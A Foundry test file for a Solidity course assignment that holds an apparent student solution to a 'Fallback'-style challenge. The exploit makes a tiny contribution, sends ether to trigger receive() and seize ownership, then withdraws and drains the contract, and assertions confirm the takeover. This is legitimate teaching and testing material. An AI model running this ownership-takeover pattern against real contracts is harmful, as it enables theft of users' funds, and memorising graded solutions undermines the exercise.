// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Assignment11.sol";

contract FallbackTest is Test {
    Assignment11 fallbackContract;
    address student;

    function setUp() public {
        student = vm.addr(1);
        vm.deal(student, 1 ether); // Fund student account
        fallbackContract = new Assignment11();
    }

    function exploit() internal {
    vm.startPrank(student);
    // 1. Contribute a small amount (less than 0.001 ether)
    fallbackContract.contribute{value: 0.0005 ether}();

    // 2. Send ether to the contract to trigger receive() and become the owner
    (bool sent, ) = address(fallbackContract).call{value: 1 wei}("");
    require(sent, "Failed to send ether");

    // 3. Withdraw all funds as the new owner
    fallbackContract.withdraw();
    vm.stopPrank();
    }

    function testStudentSolution() public {
        exploit();
        
        verifySolution();
    }

    function verifySolution() internal {
        assertEq(fallbackContract.owner(), student, "Ownership not transferred");
        assertEq(address(fallbackContract).balance, 0, "Contract balance not drained");
    }
}
